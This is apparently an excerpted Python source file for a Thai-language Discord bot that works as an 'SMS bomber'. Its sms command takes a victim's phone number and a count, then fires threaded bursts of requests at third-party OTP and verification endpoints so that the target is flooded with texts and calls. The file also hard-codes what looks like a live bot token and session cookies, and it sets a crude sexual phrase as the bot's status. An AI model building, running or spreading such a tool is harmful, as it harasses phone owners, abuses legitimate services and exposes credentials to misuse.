...
PREFIX = 's2.' #คำนำหน้าตอนใช้คำสั่ง
TOKEN = 'OTc5NTkwMzA4OTgxNTA2MTA5.GzG3fW.OOofNfClQouZETm0aWq33II60MxrW8GN4DJS8o' #TOKEN ของบอท
...
def call13(phone):
    post("https://virtserver.swaggerhub.com/THEhack/SMS/1.0.0/inventory?searchString=%E0%B8%94%E0%B8%B5&skip=30&limit=50")
#https://swagger.io/specification/
...
def call20(phone):
    post("https://www.theconcert.com/rest/request-otp",json={"mobile":phone,"country_code":"TH","lang":"th","channel":"call","digit":4},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_gcl_au=1.1.708266966.1646798262;_fbp=fb.1.1646798263293.934490162;_gid=GA1.2.1869205174.1646798265;__gads=ID=3a9d3224d965d1d5-2263d5e0ead000a6:T=1646798265:RT=1646798265:S=ALNI_MZ7vpsoTaLNez288scAjLhIUalI6Q;_ga=GA1.2.2049889473.1646798264;_gat_UA-133219660-2=1;_ga_N9T2LF0PJ1=GS1.1.1646798262.1.1.1646799146.0;adonis-session=a5833f7b41f8bc112c05ff7f5fe3ed6fONCSG8%2Fd2it020fnejGzFhf%2BeWRoJrkYZwCGrBn6Ig5KK0uAhDeYZZgjdJeWrEkd2QqanFeA2r8s%2FXf7hI1zCehOFlqYcV7r4s4UQ7DuFMpu4ZJ45hicb4xRhrJpyHUA;XSRF-TOKEN=aacd25f1463569455d654804f2189bc77TyRxsqGOH%2FFozctmiwq6uL6Y4hAbExYamuaEw%2FJqE%2FrWzfaNdyMEtwfkls7v8UUNZ%2BFWMqd9pYvjGolK9iwiJm5NW34rWtFYoNC83P0DdQpoiYfm%2FKWn1DuSBbrsEkV"})
#https://swagger.io/specification/ด
...
def startall(phone, amount):
    for x in range(amount):
        ...
        threading.submit(call16, phone)
        threading.submit(call17, phone)
        threading.submit(call18, phone)
        threading.submit(call19, phone)
        threading.submit(call20, phone)
        threading.submit(call11, phone)
        threading.submit(call12, phone)
        threading.submit(call13, phone)
        threading.submit(call14, phone)
        threading.submit(call15, phone)
        threading.submit(call16, phone)
        threading.submit(call17, phone)
        threading.submit(call18, phone)
        threading.submit(call19, phone)
...
async def on_ready():
    ...
    await bot.change_presence(status=discord.Status.idle, activity=discord.Activity(type=discord.ActivityType.playing, name='ขอเย็ดหี ดูหี เลียหี หน่อย '))
    os.system("clear")
    print('''
╔════════════════════════════════════════════╗
║     .______     ______   .___________.     ║
...
@bot.command()
async def help(ctx):
    await ctx.send(f"** คำสั่งยิงเบอร์ | {PREFIX}sms [เบอร์] [จำนวน0- {str(LIMIT)}] รอบ **", delete_after=10000000)
    embed.set_footer(text=" | Bot by 𝑻𝑯𝑬 𝐇𝐚𝐜𝐤#8899")
    embed.set_author(name='𝑻𝑯𝑬 SMS')
    embed.set_thumbnail(url='https://i.pinimg.com/originals/70/a5/52/70a552e8e955049c8587b2d7606cd6a6.gif')
    embed.set_image(url='https://media.discordapp.net/attachments/980439692287832097/982099539685163078/giphy.gif')
...
async def sms(ctx, phone=None, amount=None):
    if (str(ctx.message.channel.id) == '982881995799547964'):
        if (phone == None or amount == None):
            ...
            embed.set_image(url='https://media.discordapp.net/attachments/980439692287832097/982099842572648498/standard.gif')
            await ctx.send(embed=embed,)
            ...
            if (phone not in blacklist):
                try:
                    ...
                    if (amount > LIMIT):
                        ...
                        embed.set_author(name='𝑻𝑯𝑬 SMS')
                        embed.set_thumbnail(url='https://i.pinimg.com/originals/70/a5/52/70a552e8e955049c8587b2d7606cd6a6.gif')
                        embed.set_image(url='https://media.discordapp.net/attachments/980439692287832097/982098563242795008/IMG_20220602_102248.jpg')
                        await ctx.send(embed=embed,)
        ...
        embed.set_author(name='𝑻𝑯𝑬 SMS')
        embed.set_thumbnail(url='https://media.discordapp.net/attachments/680449178626818065/909437371097972747/794404253744496642.gif')
        embed.set_image(url='https://media.discordapp.net/attachments/980439692287832097/982099365646729296/GIF_-____-_Discover__Share_GIFs.gif')
        await ctx.send(embed=embed,)
        await ctx.message.delete()
